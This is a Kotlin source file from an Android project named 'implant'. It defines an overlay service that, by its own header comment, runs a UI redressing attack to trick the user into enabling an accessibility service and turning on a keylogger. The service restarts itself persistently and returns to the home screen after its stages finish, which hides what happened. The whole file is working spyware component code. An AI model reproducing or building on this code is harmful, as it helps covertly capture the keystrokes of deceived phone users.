/*
* Android Service that draws an overlay over the system contents.
* This will be used to launch a UI redressing attack to trick the user into enabling our
* AccessibilityService and activating our KeyLogger.
* */
package com.cooperthecoder.implant

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import android.view.WindowManager


class OverlayService : Service(), RedressingAttack.Listener {

    private val windowManager: WindowManager by lazy {
        getSystemService(Context.WINDOW_SERVICE) as WindowManager
    }
    private lateinit var attack: RedressingAttack

    companion object {
        @JvmStatic
        private val TAG: String = javaClass.name
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        val stages = ArrayList<Stage>()
        stages.add(AccessiblityStage(this))
        attack = RedressingAttack(stages)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        attack.moveToNext(this, windowManager)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        attack.stopAttack(this, windowManager)
    }

    override fun onAttackDone() {
        Log.d(TAG, "Stage completed")
        // Go to the home screen if there are no more stages
        if (!attack.moveToNext(this, windowManager)) {
            attack.stopAttack(this, windowManager)
            stopSelf()
            val intent = Intent(Intent.ACTION_MAIN)
            intent.addCategory(Intent.CATEGORY_HOME)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
    }
}

